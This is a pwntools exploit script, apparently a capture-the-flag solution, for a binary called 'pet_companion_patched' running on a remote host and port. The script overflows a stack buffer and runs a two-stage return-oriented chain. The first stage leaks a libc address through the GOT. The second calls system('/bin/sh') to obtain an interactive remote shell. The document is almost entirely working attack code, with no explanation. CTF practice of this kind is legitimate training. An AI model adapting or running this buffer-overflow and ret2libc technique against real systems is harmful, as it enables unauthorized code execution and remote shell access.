from pwn import *

exe = ELF("pet_companion_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

remote_url = "94.237.56.248"
remote_port = 44146
gdbscript = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

r = conn()
menu_delim = b'> '
def logbase(): info('libc.address = %#x' % libc.address)
def logleak(name, val):  info(name+' = %#x' % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def so(data): return r.send(data)
def sn(num): return str(num).encode()
def menu(num): return sla(menu_delim, sn(num))

pop_rdi = 0x0000000000400743
pop_rsi_r15 = 0x0000000000400741

# 1st ROP: Leak read via write, then back to main
payload = b'a'*0x40
payload += p64(exe.bss()+0x100)
payload += p64(pop_rsi_r15)
payload += p64(exe.got.read)
payload += p64(0)
payload += p64(exe.plt.write)
payload += p64(exe.sym.main)
sla(b': ', payload)
r.recvuntil(b'Configuring...\n\n')
libc.address = u64(r.recv(6).ljust(8, b'\x00')) - libc.sym.read
logleak('libc.address', libc.address)

# 2nd ROP: Execute system("/bin/sh")
payload = b'a'*0x40
payload += p64(exe.bss()+0x100)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(libc.sym.system)
sla(b': ', payload)
r.interactive()

